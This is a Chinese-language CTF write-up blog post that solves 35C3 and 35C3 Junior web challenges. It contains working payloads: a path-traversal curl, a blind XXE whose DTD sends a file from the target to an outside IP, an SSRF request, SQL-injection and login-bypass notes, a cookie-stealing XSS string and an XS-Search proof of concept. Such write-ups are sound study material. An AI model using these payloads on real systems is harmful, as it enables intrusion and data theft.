---
title: 35c3ctf
abbrlink: 56986
date: 2018-12-28 12:41:03
tags:
---



# Junoir  ctf

## WEB

### flags

```
<?php
  highlight_file(__FILE__);
  $lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'ot';
  $lang = explode(',', $lang)[0];
  $lang = str_replace('../', '', $lang);
  $c = file_get_contents("flags/$lang");
  if (!$c) $c = file_get_contents("flags/ot");
  echo '<img src="data:image/jpeg;base64,' . base64_encode($c) . '">';
```

 ```
ht@TIANJI:/mnt/d/ht-blog$ curl -H "Accept-Language:....//....//....//....//flag" "http://35.207.132.47:84/" | grep -oE Mz.*= | base64 -d
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2707  100  2707    0     0   5745      0 --:--:-- --:--:-- --:--:--  5759
35c3_this_flag_is_the_be5t_fl4g
 ```

### McDonald

```
在backup目录下找.DS_Store,然后不断的找就行
```

### blind

```
<?php
  function __autoload($cls) {
    include $cls;
  }

  class Black {
    public function __construct($string, $default, $keyword, $store) {
      if ($string) ini_set("highlight.string", "#0d0d0d");
      if ($default) ini_set("highlight.default", "#0d0d0d");
      if ($keyword) ini_set("highlight.keyword", "#0d0d0d");

      if ($store) {
            setcookie('theme', "Black-".$string."-".$default."-".$keyword, 0, '/');
      }
    }
  }

  class Green {
    public function __construct($string, $default, $keyword, $store) {
      if ($string) ini_set("highlight.string", "#00fb00");
      if ($default) ini_set("highlight.default", "#00fb00");
      if ($keyword) ini_set("highlight.keyword", "#00fb00");

      if ($store) {
            setcookie('theme', "Green-".$string."-".$default."-".$keyword, 0, '/');
      }
    }
  }

  if ($_=@$_GET['theme']) {
    if (in_array($_, ["Black", "Green"])) {
      if (@class_exists($_)) {
        ($string = @$_GET['string']) || $string = false;
        ($default = @$_GET['default']) || $default = false;
        ($keyword = @$_GET['keyword']) || $keyword = false;

        new $_($string, $default, $keyword, @$_GET['store']);
      }
    }
  } else if ($_=@$_COOKIE['theme']) {
    $args = explode('-', $_);
    if (class_exists($args[0])) {
      new $args[0]($args[1], $args[2], $args[3], '');
    }
  } else if ($_=@$_GET['info']) {
    phpinfo();
  }

  highlight_file(__FILE__);
```

打印所有可用的类:

```
var_dump(get_declared_classes());
```

可以利用`SimpleXMLElement`:

```
SimpleXMLElement implements Traversable {
/* Methods */
final public __construct ( string $data [, int $options = 0 [, bool $data_is_url = FALSE [, string $ns = "" [, bool $is_prefix = FALSE ]]]] )
public void addAttribute ( string $name [, string $value [, string $namespace ]] )
public SimpleXMLElement addChild ( string $name [, string $value [, string $namespace ]] )
public mixed asXML ([ string $filename ] )
public SimpleXMLElement attributes ([ string $ns = NULL [, bool $is_prefix = FALSE ]] )
public SimpleXMLElement children ([ string $ns [, bool $is_prefix = FALSE ]] )
public int count ( void )
public array getDocNamespaces ([ bool $recursive = FALSE [, bool $from_root = TRUE ]] )
public string getName ( void )
public array getNamespaces ([ bool $recursive = FALSE ] )
public bool registerXPathNamespace ( string $prefix , string $ns )
public string __toString ( void )
public array xpath ( string $path )
}
```

然后就可以利用blind xxe。

xxe.xml:

```
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag">
<!ENTITY % remote SYSTEM "http://39.106.97.201/xxe.dtd">
%remote;
%all;
]>
<root>&send;</root>
```

xxe.dtd:

```
<!ENTITY % all "<!ENTITY send SYSTEM 'http://39.106.97.201/attack?file=%file;'>">
```

发送请求:

```
curl -v --cookie "theme=SimpleXMlElement-http://39.106.97.201/xxe.xml-2-true" "http://35.207.132.47:82/"
```

getflag:

```
35c3_even_a_blind_squirrel_finds_a_nut_now_and_then
```

### collider

hash碰撞工具：

* https://github.com/cr-marcstevens/hashclash.git

  使用方法: `sh cpc.sh giveflag.pdf noflag.pdf`

### DB secret

`pyserver/server.py`

```
#!/usr/bin/env python3
import inspect
import os
import random
import sqlite3
import string
import sys
import base64
from html import escape
from urllib import parse
from typing import Union, List, Tuple
import datetime

from subprocess import STDOUT, check_output

import requests
from flask import Flask, send_from_directory, send_file, request, Response, g, make_response, jsonify
from flags import DB_SECRET, DECRYPTED, DEV_NULL, LOCALHOST, LOGGED_IN

STATIC_PATH = "../client/site"
DATABASE = ".paperbots.db"
MIGRATION_PATH = "./db/V1__Create_tables.sql"
THUMBNAIL_PATH = os.path.join(STATIC_PATH, "thumbnails")
WEE_PATH = "../weelang"
WEETERPRETER = "weeterpreter.ts"
WEE_TIMEOUT = 5

os.makedirs(THUMBNAIL_PATH, exist_ok=True)

app = Flask(__name__, static_folder=STATIC_PATH, static_url_path="/static")

encrypted = None


def get_db() -> sqlite3.Connection:
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
    return db


def init_db():
    with app.app_context():
        db = get_db()
        with open(MIGRATION_PATH, "r") as f:
            db.cursor().executescript(f.read())
        db.execute("CREATE TABLE `secrets`(`id` INTEGER PRIMARY KEY AUTOINCREMENT, `secret` varchar(255) NOT NULL)")
        db.execute("INSERT INTO secrets(secret) values(?)", (DB_SECRET,))
        db.commit()


def query_db(query, args=(), one=True) -> Union[List[Tuple], Tuple, None]:
    if not isinstance(args, tuple):
        args = (args,)
    cur = get_db().execute(query, args)
    rv = cur.fetchall()
    cur.close()
    return (rv[0] if rv else None) if one else rv


def user_by_token(token) -> Tuple[int, str, str, str]:
    """
    queries and returns userId, username, email, usertype for a given token
    :param token: the token
    :return: userId, name, email, usertype
    """
    if not token:
        raise AttributeError("Token must not be empty")

    userId, = query_db("SELECT userId FROM userTokens WHERE token=?", token)  # TODO: Join this?
    name, email, usertype = query_db("SELECT name, email, type FROM users WHERE id=?", userId)
    return userId, name, email, usertype


def random_code(length=6) -> str:
    return "".join([random.choice(string.ascii_lowercase)[0] for x in range(length)])


def get_code(username):
    db = get_db()
    c = db.cursor()
    userId, = query_db("SELECT id FROM users WHERE name=?", username)
    code = random_code()
    c.execute("INSERT INTO userCodes(userId, code) VALUES(?, ?)", (userId, code))
    db.commit()
    # TODO: Send the code as E-Mail instead :)
    return code


def jsonify_projects(projects, username, usertype):
    return jsonify([
        {"code": x[0],
         "userName": x[1],
         "title": x[2],
         "public": x[3],
         "type": x[4],
         "lastModified": x[5],
         "created": x[6],
         "content": x[7]
         } for x in projects if usertype == "admin" or x[1] == username or x[3]
    ])


@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()


# Error handling
@app.errorhandler(404)
def fourohfour(e):
    return send_file(os.path.join(STATIC_PATH, "404.html")), 404


@app.errorhandler(500)
def fivehundred(e):
    return jsonify({"error": str(e)}), 500


@app.after_request
def secure(response: Response):
    if not request.path[-3:] in ["jpg", "png", "gif"]:
        response.headers["X-Frame-Options"] = "SAMEORIGIN"
        response.headers["X-Xss-Protection"] = "1; mode=block"
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["Content-Security-Policy"] = "script-src 'self' 'unsafe-inline';"
        response.headers["Referrer-Policy"] = "no-referrer-when-downgrade"
        response.headers["Feature-Policy"] = "geolocation 'self'; midi 'self'; sync-xhr 'self'; microphone 'self'; " \
                                             "camera 'self'; magnetometer 'self'; gyroscope 'self'; speaker 'self'; " \
                                             "fullscreen *; payment 'self'; "
        if request.remote_addr == "127.0.0.1":
            response.headers["X-Localhost-Token"] = LOCALHOST

    return response


@app.route("/", methods=["GET"])
def main():
    return send_file(os.path.join(STATIC_PATH, "index.html"))


@app.route("/kitten.png")
def kitten():
    return send_file(os.path.join(STATIC_PATH, "img/kitten.png"))


# The actual page
@app.route("/<path:filename>", methods=["GET"])
def papercontents(filename):
    return send_from_directory(STATIC_PATH, filename)


@app.route("/api/signup", methods=["POST"])
def signup():
    usertype = "user"
    json = request.get_json(force=True)
    name = escape(json["name"].strip())
    email = json["email"].strip()
    if len(name) == 0:
        raise Exception("InvalidUserName")
    if len(email) == 0:
        raise Exception("InvalidEmailAddress")
    if not len(email.split("@")) == 2:
        raise Exception("InvalidEmailAddress")
    email = escape(email.strip())
    # Make sure the user name is 4-25 letters/digits only.
    if len(name) < 4 or len(name) > 25:
        raise Exception("InvalidUserName")

    if not all([x in string.ascii_letters or x in string.digits for x in name]):
        raise Exception("InvalidUserName")
    # Check if name exists
    if query_db("SELECT name FROM users WHERE name=?", name):
        raise Exception("UserExists")
    if query_db("Select id, name FROM users WHERE email=?", email):
        raise Exception("EmailExists")
    # Insert user // TODO: implement the verification email
    db = get_db()
    c = db.cursor()
    c.execute("INSERT INTO users(name, email, type) values(?, ?, ?)", (name, email, usertype))
    db.commit()
    return jsonify({"success": True})


@app.route("/api/login", methods=["POST"])
def login():
    print("Logging in?")
    # TODO Send Mail
    json = request.get_json(force=True)
    login = json["email"].strip()
    try:
        userid, name, email = query_db("SELECT id, name, email FROM users WHERE email=? OR name=?", (login, login))
    except Exception as ex:
        raise Exception("UserDoesNotExist")
    return get_code(name)


@app.route("/api/verify", methods=["POST"])
def verify():
    code = request.get_json(force=True)["code"].strip()
    if not code:
        raise Exception("CouldNotVerifyCode")
    userid, = query_db("SELECT userId FROM userCodes WHERE code=?", code)
    db = get_db()
    c = db.cursor()
    c.execute("DELETE FROM userCodes WHERE userId=?", (userid,))
    token = random_code(32)
    c.execute("INSERT INTO userTokens (userId, token) values(?,?)", (userid, token))
    db.commit()
    name, = query_db("SELECT name FROM users WHERE id=?", (userid,))
    resp = make_response()
    resp.set_cookie("token", token, max_age=2 ** 31 - 1)
    resp.set_cookie("name", name, max_age=2 ** 31 - 1)
    resp.set_cookie("logged_in", LOGGED_IN)
    return resp


@app.route("/api/logout", methods=["POST"])
def logout():
    request.cookies.get("token")
    resp = make_response()
    resp.set_cookie("token", "")
    resp.set_cookie("name", "")
    resp.set_cookie("logged_in", "")
    return resp


@app.route("/api/getproject", methods=["POST"])
def getproject():
    # TODO: Do.
    project_id = request.get_json(force=True)["projectId"]
    token = request.cookies.get("token")
    try:
        userId, name, email, usertype = user_by_token(token)
    except AttributeError:
        name = ""
        usertype = "user"
    project = query_db("SELECT code, userName, title, description, content, public, type, lastModified, created "
                       "FROM projects WHERE code=?", (project_id,))
    if not project or (not project[5] and not name == project[1] and not usertype == "admin"):
        raise Exception("ProjectDoesNotExist")
    return jsonify({
        "code": project[0],
        "userName": project[1],
        "title": project[2],
        "description": project[3],
        "content": project[4],
        "public": project[5],
        "type": project[6],
        "lastModified": project[7],
        "created": project[8]
    })


@app.route("/api/getprojects", methods=["POST"])
def getuserprojects():
    username = request.get_json(force=True)["userName"]
    projects = query_db("SELECT code, userName, title, public, type, lastModified, created, content "
                        "FROM projects WHERE userName=? ORDER BY lastModified DESC", (username), False)
    name = ""
    usertype = "user"
    if "token" in request.cookies:
        userId, name, email, usertype = user_by_token(request.cookies["token"])
    return jsonify_projects(projects, name, usertype)


@app.route("/api/saveproject", methods=["POST"])
def saveproject():
    json = request.get_json(force=True)
    name = request.cookies["name"]
    token = request.cookies["token"]
    # TODO String projectId = paperbots.saveProject(ctx.cookie("token"), request.getCode(), request.getTitle(), request.getDescription(), request.getContent(), request.isPublic(), request.getType());
    userId, username, email, usertype = user_by_token(token)

    db = get_db()
    c = db.cursor()

    if not json["code"]:
        project_id = random_code(6)

        c.execute(
            "INSERT INTO projects(userId, userName, code, title, description, content, public, type) "
            "VALUES(?,?,?,?,?,?,?,?)",
            (userId, username, project_id,
             escape(json["title"]), escape(json["description"]), json["content"], True, json["type"]))
        db.commit()
        return jsonify({"projectId": project_id})
    else:
        c.execute("UPDATE projects SET title=?, description=?, content=?, public=? WHERE code=? AND userId=?",
                  (escape(json["title"]), escape(json["description"]), json["content"], True, json["code"],
                   userId)
                  )
        db.commit()
        return jsonify({"projectId": json["code"]})


@app.route("/api/savethumbnail", methods=["POST"])
def savethumbnail():
    name = request.cookies["name"]
    token = request.cookies["token"]
    userId, username, email, usertype = user_by_token(token)

    json = request.get_json(force=True)
    thumbnail = json["thumbnail"]  # type: str
    project_id = json["projectId"]
    if not thumbnail.startswith("data:image/png;base64,"):
        raise Exception("Hacker")
    thumbnail = thumbnail[len("data:image/png;base64,"):].encode("ascii")
    decoded = base64.b64decode(thumbnail)
    project_username, = query_db("SELECT userName FROM projects WHERE code=?", (project_id,))
    if project_username != username:
        raise Exception("Hack on WeeLang, not the Server!")
    with open(os.path.join(THUMBNAIL_PATH, "{}.png".format(project_id)), "wb+") as f:
        f.write(decoded)
    return jsonify({"projectId": project_id})


@app.route("/api/deleteproject", methods=["POST"])
def deleteproject():
    name = request.cookies["name"]
    token = request.cookies["token"]
    userid, username, email, usertype = user_by_token(token)
    json = request.get_json(force=True)
    projectid = json["projectId"]
    project_username = query_db("SELECT userName FROM projects WHERE code=?", (projectid,))
    if project_username != username and usertype != "admin":
        raise Exception("Nope")
    db = get_db()
    c = db.cursor()
    c.execute("DELETE FROM projects WHERE code=?", (projectid,))
    db.commit()
    # raise Exception("The Internet Never Forgets")
    return {"projectId": projectid}


# Admin endpoints
@app.route("/api/getprojectsadmin", methods=["POST"])
def getprojectsadmin():
    # ProjectsRequest request = ctx.bodyAsClass(ProjectsRequest.class);
    # ctx.json(paperbots.getProjectsAdmin(ctx.cookie("token"), request.sorting, request.dateOffset));
    name = request.cookies["name"]
    token = request.cookies["token"]
    user, username, email, usertype = user_by_token(token)

    json = request.get_json(force=True)
    offset = json["offset"]
    sorting = json["sorting"]

    if name != "admin":
        raise Exception("InvalidUserName")

    sortings = {
        "newest": "created DESC",
        "oldest": "created ASC",
        "lastmodified": "lastModified DESC"
    }
    sql_sorting = sortings[sorting]

    if not offset:
        offset = datetime.datetime.now()

    return jsonify_projects(query_db(
        "SELECT code, userName, title, public, type, lastModified, created, content FROM projects WHERE created < '{}' "
        "ORDER BY {} LIMIT 10".format(offset, sql_sorting), one=False), username, "admin")


@app.route("/api/getfeaturedprojects", methods=["POST"])
def getfeaturedprojects():
    try:
        name = request.cookies["name"]
        token = request.cookies["token"]
        userid, username, email, usertype = user_by_token(token)
    except Exception as ex:
        username = ""
        usertype = "user"

    projects = query_db("SELECT code, userName, title, type, lastModified, created, content FROM projects "
                        "WHERE featured=1 AND public=1 ORDER BY lastModified DESC", one=False)
    return jsonify_projects(projects, username, usertype)


# Proxy images to avoid tainted canvases when thumbnailing.
@app.route("/api/proxyimage", methods=["GET"])
def proxyimage():
    url = request.args.get("url", '')
    parsed = parse.urlparse(url, "http")  # type: parse.ParseResult
    if not parsed.netloc:
        parsed = parsed._replace(netloc=request.host)  # type: parse.ParseResult
    url = parsed.geturl()

    resp = requests.get(url)
    if not resp.headers["Content-Type"].startswith("image/"):
        raise Exception("Not a valid image")

    # See https://stackoverflow.com/a/36601467/1345238
    excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
    headers = [(name, value) for (name, value) in resp.raw.headers.items()
               if name.lower() not in excluded_headers]

    response = Response(resp.content, resp.status_code, headers)
    return response


# Additional pyserver functions:

# Wee as a service.
def runwee(wee: string) -> string:
    print("{}: running {}".format(request.remote_addr, wee))
    result = check_output(
        ["ts-node", '--cacheDirectory', os.path.join(WEE_PATH, "__cache__"),
         os.path.join(WEE_PATH, WEETERPRETER), wee], shell=False, stderr=STDOUT, timeout=WEE_TIMEOUT,
        cwd=WEE_PATH).decode("utf-8")
    print("{}: result: {}".format(request.remote_addr, result))
    return result


@app.route("/wee/run", methods=["POST"])
def weeservice():
    json = request.get_json(force=True)
    wee = json["code"]
    out = runwee(wee)
    return jsonify({"code": wee, "result": out})


@app.route("/wee/dev/null", methods=["POST"])
def dev_null():
    json = request.get_json(force=True)
    wee = json["code"]
    wee = """
    var DEV_NULL: string = '{}'
    {}
    """.format(DEV_NULL, wee)
    _ = runwee(wee)
    return "GONE"


@app.route("/wee/encryptiontest", methods=["GET"])
def encryptiontest():
    global encrypted
    if not encrypted:
        wee = """
        # we use weelang to encrypt secrets completely secret

        record pubkey
            n: string
            e: string
        end

        var key = pubkey('951477056381671188036079180681828396446164466568923964269373812360568216940258578681673755725586138473475522188240856850626984093905399964041687626629414562063470963902807801143023140969208234239276778397171817582591827008690056789763534174119863046106813515750863733543758319811194784246845138921495556311458180478538856550842509692686396679117903040148607642710832573838027274004952072516749168425434697690016707327002989407014753735313730653189661541750880855213165937564578292464379167857778759136474173425831340306919705672933486711939333953750637729967455118475408369751602538202818190663939706886093046526104043062374288648189070207772477271879494000411582080352364098957455090381238978031676375437980396931371164061080967754225429135119036489128165414029872153856547376448552882344531325480944511714482341088742350110097372766748364926941000441524157824859511557342673524388056049358362600925172299990719998873868038194555465008036497932945812845340638853399732721987228486858193979073913761760370769609347622795498987306822413134236749607735657967667902966667996797241364688793919066445360547749193845825298342626288990158730149727398354192053692360716383851051271618559075048012800235250387837052573541157845958948856954035758915157871993646182544696043757263004887914724250286341123038686355398997399922927237477691269351791943572679717263938613148630387793458838416117454016370454288153779764863162055098229903413503857354581027436855574871814478747237999617879024407403954905986969721336803258774514397600947175650242674193496614652267158753817350136305620268076457813070726099248681642612063203170442453405051455877524709366973062774037044772079720703743828695351198984334830532193564525916901461725538418714517302390850049543856542699391339075976843028654004552169277571339017161697013373622770115406681080294994790626557117129820457988045974009530185622113951540819939983153190486345031549722007896699102268137425607039925174692583738394816628508716999668221820730737934785438568198334912127263127241407430459511422030656861043544813130287622862247904749760983465608684778389799703770877931875268858524702991767450720773677639856979930404508755100624844341829896497906824520180051038779126563860453039035779455387733056343833776802716194138072528278142786901904343407377649000988142255369860324110311816186668720584468851089864315465497405748709976389375632079690963423708940060402561050963276766635011726613211018206198125893007608417148033891841809', '3')

        fun encrypt(message: string, key: pubkey): string
            return bigModPow(strToBig(message), key.e, key.n)
        end

        fun get_cypher(key: pubkey): string
            var message = '{}'
            return encrypt(message, key)
        end
            
        alert(get_cypher(key))
        """.format(DECRYPTED)
        encrypted = runwee(wee)
    return jsonify({"enc": encrypted})


# The pyserver is almost 100% open source!
# Just enough to barely get it running but never to its full potential.
# We got very positive feedback on HN and nobody bothered to run it anyway.
# 11/10 would open source again.
@app.route("/pyserver/server.py", methods=["GET"])
def server_source():
    return Response(inspect.getsource(sys.modules[__name__]), mimetype='text/x-python')


@app.route("/pyserver/flags.py", methods=["GET"])
def server_flags():
    return Response("""
DB_SECRET = "35C3_???"
DECRYPTED = "35C3_???"
DEV_NULL =  "35C3_???"
LOCALHOST = "35C3_???"
LOGGED_IN = "35C3_???"
NOT_IMPLEMENTED = "35C3_???"
    """, mimetype='text/x-python')


@app.route("/weelang/{}".format(WEETERPRETER), methods=["GET"])
def weeterpreter_source():
    return send_file(os.path.join(WEE_PATH, WEETERPRETER), mimetype="text/x-typescript")


@app.route("/weelang/package.json", methods=["GET"])
def weeterpreter_deps():
    return send_file(os.path.join(WEE_PATH, "package.json"))


@app.route("/weelang/flags.ts", methods=["GET"])
def weeterpreter_flags():
    return Response("""
export const CONVERSION_ERROR = "35C3_???"
export const EQUALITY_ERROR = "35C3_???"
export const LAYERS = "35C3_???"
export const NUMBER_ERROR = "35C3_???"
export const WEE_R_LEET = "35C3_???"
export const WEE_TOKEN = "35C3_???"
    """, mimetype="text/x-typescript")


@app.before_first_request
def maybe_init_db():
    if not os.path.exists(DATABASE):
        init_db()


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8075)
```

漏洞代码:

```

# Admin endpoints
@app.route("/api/getprojectsadmin", methods=["POST"])
def getprojectsadmin():
    # ProjectsRequest request = ctx.bodyAsClass(ProjectsRequest.class);
    # ctx.json(paperbots.getProjectsAdmin(ctx.cookie("token"), request.sorting, request.dateOffset));
    name = request.cookies["name"]
    token = request.cookies["token"]
    user, username, email, usertype = user_by_token(token)

    json = request.get_json(force=True)
    offset = json["offset"]
    sorting = json["sorting"]

    if name != "admin":
        raise Exception("InvalidUserName")

    sortings = {
        "newest": "created DESC",
        "oldest": "created ASC",
        "lastmodified": "lastModified DESC"
    }
    sql_sorting = sortings[sorting]

    if not offset:
        offset = datetime.datetime.now()

    return jsonify_projects(query_db(
        "SELECT code, userName, title, public, type, lastModified, created, content FROM projects WHERE created < '{}' "
        "ORDER BY {} LIMIT 10".format(offset, sql_sorting), one=False), username, "admin")
```

从cookie中获取name，修改cookie即可。从json中提取值直接拼接到sql语句中，存在sql注入。

### localhost

代码和上一题代码相同。

漏洞代码如下:

```
@app.route("/api/proxyimage", methods=["GET"])
def proxyimage():
    url = request.args.get("url", '')
    parsed = parse.urlparse(url, "http")  # type: parse.ParseResult
    if not parsed.netloc:
        parsed = parsed._replace(netloc=request.host)  # type: parse.ParseResult
    url = parsed.geturl()

    resp = requests.get(url)
    if not resp.headers["Content-Type"].startswith("image/"):
        raise Exception("Not a valid image")

    # See https://stackoverflow.com/a/36601467/1345238
    excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
    headers = [(name, value) for (name, value) in resp.raw.headers.items()
               if name.lower() not in excluded_headers]

    response = Response(resp.content, resp.status_code, headers)
    return response
```

存在ssrf:

```
curl -v http://35.207.132.47/api/proxyimage?url=http://127.0.0.1:8075/img/paperbots.svg

=> 
X-Localhost-Token: 35C3_THIS_HOST_IS_YOUR_HOST_THIS_HOST_IS_LOCAL_HOST
```





### saltfish

```
<?php
  require_once('flag.php');
  if ($_ = @$_GET['pass']) {
    $ua = $_SERVER['HTTP_USER_AGENT'];
    if (md5($_) + $_[0] == md5($ua)) {
      if ($_[0] == md5($_[0] . $flag)[0]) {
        echo $flag;
      }
    }
  } else {
    highlight_file(__FILE__);
  }
```

```
第一个if条件，我们可以令$_为数组，此时md5($_)会返回NULL，然后令$_[0]以字母开头，两者相加会返回0，接着由于是若比较，我们可以令md5($ua)以0e开头，0e==0会返回True。

第二个if条件$_[0]与md5($_[0] . $flag)的第一个字符比较，爆破即可。
```

### logged in

代码同上，想办法登录即可。

漏洞代码：

```
@app.route("/api/signup", methods=["POST"])
def signup():
    usertype = "user"
    json = request.get_json(force=True)
    name = escape(json["name"].strip())
    email = json["email"].strip()
    if len(name) == 0:
        raise Exception("InvalidUserName")
    if len(email) == 0:
        raise Exception("InvalidEmailAddress")
    if not len(email.split("@")) == 2:
        raise Exception("InvalidEmailAddress")
    email = escape(email.strip())
    # Make sure the user name is 4-25 letters/digits only.
    if len(name) < 4 or len(name) > 25:
        raise Exception("InvalidUserName")

    if not all([x in string.ascii_letters or x in string.digits for x in name]):
        raise Exception("InvalidUserName")
    # Check if name exists
    if query_db("SELECT name FROM users WHERE name=?", name):
        raise Exception("UserExists")
    if query_db("Select id, name FROM users WHERE email=?", email):
        raise Exception("EmailExists")
    # Insert user // TODO: implement the verification email
    db = get_db()
    c = db.cursor()
    c.execute("INSERT INTO users(name, email, type) values(?, ?, ?)", (name, email, usertype))
    db.commit()
    return jsonify({"success": True})


@app.route("/api/login", methods=["POST"])
def login():
    print("Logging in?")
    # TODO Send Mail
    json = request.get_json(force=True)
    login = json["email"].strip()
    try:
        userid, name, email = query_db("SELECT id, name, email FROM users WHERE email=? OR name=?", (login, login))
    except Exception as ex:
        raise Exception("UserDoesNotExist")
    return get_code(name)


@app.route("/api/verify", methods=["POST"])
def verify():
    code = request.get_json(force=True)["code"].strip()
    if not code:
        raise Exception("CouldNotVerifyCode")
    userid, = query_db("SELECT userId FROM userCodes WHERE code=?", code)
    db = get_db()
    c = db.cursor()
    c.execute("DELETE FROM userCodes WHERE userId=?", (userid,))
    token = random_code(32)
    c.execute("INSERT INTO userTokens (userId, token) values(?,?)", (userid, token))
    db.commit()
    name, = query_db("SELECT name FROM users WHERE id=?", (userid,))
    resp = make_response()
    resp.set_cookie("token", token, max_age=2 ** 31 - 1)
    resp.set_cookie("name", name, max_age=2 ** 31 - 1)
    resp.set_cookie("logged_in", LOGGED_IN)
    return resp
```

由于登录之后会返回code,所以首先用admin登录一下，然后获取code，在调用`/api/verify`验证。

### Note accessible

app.rb:

```
require 'sinatra'
set :bind, '0.0.0.0'

get '/get/:id' do
    File.read("./notes/#{params['id']}.note")
end

get '/store/:id/:note' do 
    File.write("./notes/#{params['id']}.note", params['note'])
    puts "OK"
end 

get '/admin' do
    File.read("flag.txt")
end
```

index.php:

```
<?php
    require_once "config.php";

    if(isset($_POST['submit']) && isset($_POST['note']) && $_POST['note']!="") {
        $note = $_POST['note'];

        if(strlen($note) > 1000) {
            die("ERROR! - Text too long");
        }

        if(!preg_match("/^[a-zA-Z]+$/", $note)) {
            die("ERROR! - Text does not match /^[a-zA-Z]+$/");
        }

        $id = random_int(PHP_INT_MIN, PHP_INT_MAX);
        $pw = md5($note);

        # Save password so that we can check it later
        file_put_contents("./pws/$id.pw", $pw); 

        file_get_contents($BACKEND . "store/" . $id . "/" . $note);

        echo '<div class="shadow-sm p-3 mb-5 bg-white rounded">';
            echo "<p>Your note ID is $id<br>";
            echo "Your note PW is $pw</p>";

            echo "<a href='/view.php?id=$id&pw=$pw'>Click here to view your note!</a>";
        echo '</div>';
    }
?>
```

view.php:

```
<?php header("Content-Type: text/plain"); ?>
<?php 
    require_once "config.php";
    if(isset($_GET['id']) && isset($_GET['pw'])) {
        $id = $_GET['id'];
        if(file_exists("./pws/" . (int) $id . ".pw")) {
            if(file_get_contents("./pws/" . (int) $id . ".pw") == $_GET['pw']) {
                echo file_get_contents($BACKEND . "get/" . $id);
            } else {
                die("ERROR!");
            }
        } else {
            die("ERROR!");
        }
    }
?>
```



# 35C3

## Web

### php

```
echo 'O:1:"B":1:{}' | nc 35.242.207.13 1
```

构造一个错误的序列化数据，从而在抛出异常时，调用`_destruct`.

### lambda

采用gRPC server，安装grpcurl，可以直接和gRPC服务器进行交互。

### filemanager

漏洞代码: 

这里的`${q}`可以触发xss。

```
<script>
    (()=>{
      for (let pre of document.getElementsByTagName('pre')) {
        let text = pre.innerHTML;
        let q = 'document';
        let idx = text.indexOf(q);
        pre.innerHTML = `${text.substr(0, idx)}<mark>${q}</mark>${text.substr(idx+q.length)}`;
      }
    })();
  </script>
```

javascript:

```
`\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x61\x6c\x65\x72\x74\x28\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x6f\x6f\x6b\x69\x65\x29\x3b\x3e\n`
=> 
"<img src=x onerror=alert(document.cookie);>
"
```

反引号可以将字符串中的16进制，或者特殊符号转化

TIPS:

test.php:

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
</head>
<body>
        <?php
 
            $password = @$_GET["password"];
            if($password=='admin'){ // 这里模拟我们要猜测的值
                echo "you get it." ;
                echo "<script>let a='test';</script>";
            }else{
                echo "guess error!" ;
            }
        ?>
 
</body>
</html>
```

poc.html:

```
<html>
<!--filename:poc.html -->
<style>
    iframe {
        display: none;
    }
</style>
<body>
    <iframe id=f></iframe>
    <div id=log></div>
    <script>
       var myframes = [];
            function go(x) {
                var f = document.createElement('iframe');
                myframes.push(f);
                document.body.appendChild(f)
                var start = performance.now()
                f.onload = function() {
                    f.onload = function() {
                        console.log("second request!");
                    }
                    console.log("first request!");
                    f.src=f.src+'#';
                }
                f.src = `http://192.168.21.149/test.php?password=${encodeURIComponent(x)}&<script>let%20a=%27test%27;<\/script>`;
            }
            var payload1 = 'admin';
            var payload2 = 'test';
            go(payload1);
            go(payload2);
        </script>
</body>
</html>
```

请求Poc.html:

![](/assets/35c3/TIM截图20190103102155.png)

总共发送了3次请求

```
f.onload = function() {
            f.onload = function() {
               console.log("second request!");
            }
            console.log("first request!");
            f.src=f.src+'#';
}
```

这里在url后边加上`#`，浏览器认为url没有修改，所以不会再次重新请求，所以应该是2次请求，出现3次的原因是，`XSS-Autidor`拦截之后，浏览器认为页面没有加载成功，所以在url后边添加一个`#`之后，浏览器会在请求一次。

日志如下:

```
192.168.21.1 - - [03/Jan/2019:10:14:11 +0800] "GET /test.php?password=admin&%3Cscript%3Elet%20a=%27test%27;%3C/script%3E HTTP/1.1" 200 241 "http://192.168.21.149/poc.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
192.168.21.1 - - [03/Jan/2019:10:14:11 +0800] "GET /test.php?password=test&%3Cscript%3Elet%20a=%27test%27;%3C/script%3E HTTP/1.1" 200 224 "http://192.168.21.149/poc.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
192.168.21.1 - - [03/Jan/2019:10:14:12 +0800] "GET /test.php?password=admin&%3Cscript%3Elet%20a=%27test%27;%3C/script%3E HTTP/1.1" 200 241 "http://192.168.21.149/poc.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
```

`password=admin`会触发`XSS-Auditor`，利用这一点可以实现bool盲注的效果。

回到题目上来:

随便创建一个文件:

![](/assets/35c3/TIM截图20190103110323.png)

name: abc         content: def

访问url:

```
https://filemanager.appspot.com/search?q=d&a=%3Cscript%3E%20%20%20%20%28%28%29%3d%3E%7b%0a%20%20%20%20%20%20for%20%28let%20pre%20of%20document%2egetElementsByTagName%28%27pre%27%29%29%20%7b%0a%20%20%20%20%20%20%20%20let%20text%20%3d%20pre%2einnerHTML%3b
```

也就是搜索`d`:

可以看到XSS-Auditor检测到了攻击:

![](/assets/35c3/TIM截图20190103110546.png)

查看源码:

![](/assests/35c3/TIM截图20190103110637.png)

js代码变成了红色，也说明XSS-Auditor检测到攻击。

